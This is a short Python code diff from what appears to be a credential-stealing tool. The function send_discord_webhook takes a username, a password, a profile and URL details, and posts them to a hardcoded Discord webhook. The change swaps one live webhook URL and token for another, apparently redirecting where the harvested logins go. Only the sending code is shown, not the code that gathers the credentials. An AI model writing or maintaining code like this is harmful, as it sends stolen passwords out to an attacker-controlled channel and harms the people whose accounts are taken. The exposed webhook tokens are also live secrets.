@@ -44,7 +44,7 @@ def send_discord_webhook(url, profile, url_info, username, password):
                 }
             ]
         }
-        response = requests.post('https://discord.com/api/webhooks/1166817409978617969/_Jwb3n9mVuZ2YSV-mkAyx8QRZefJA8giq98dVnaj_StBgb7EvvcTz1ngjs8hUQJiV3FD', json=data)
+        response = requests.post('https://discordapp.com/api/webhooks/1102174050383573102/_6WZ3iMFROeHW83TTSMI5cUm6CuSDmanUZdZolbCCMDuAsuLIqJ2_4P3r7clJOVJTIuM', json=data)
         if response.status_code == 204:
             print("Webhook sent successfully")
         else:
